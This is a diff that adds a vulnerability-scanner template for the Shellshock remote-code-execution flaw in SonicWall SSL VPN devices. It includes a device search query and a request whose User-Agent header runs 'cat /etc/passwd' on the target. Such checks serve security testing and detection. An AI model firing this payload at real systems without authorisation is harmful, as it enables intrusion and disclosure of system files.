@@ -1,0 +1,23 @@
+name: Sonicwall SSLVPN ShellShock RCE
+manual: true
+query: app="SonicWALL-Company's-product" || app="SonicWALL-SSL-VPN"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/jarrewrite.sh
+      headers:
+        User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  links:
+  - https://twitter.com/chybeta/status/1353974652540882944
+  - https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
+  description: SonicWall is an American cybersecurity company that sells a range of
+    Internet appliances primarily directed at content control and network security.
+    These include devices providing services for network firewalls, unified threat
+    management, virtual private networks, and anti-spam for email.
+  tags: RCE
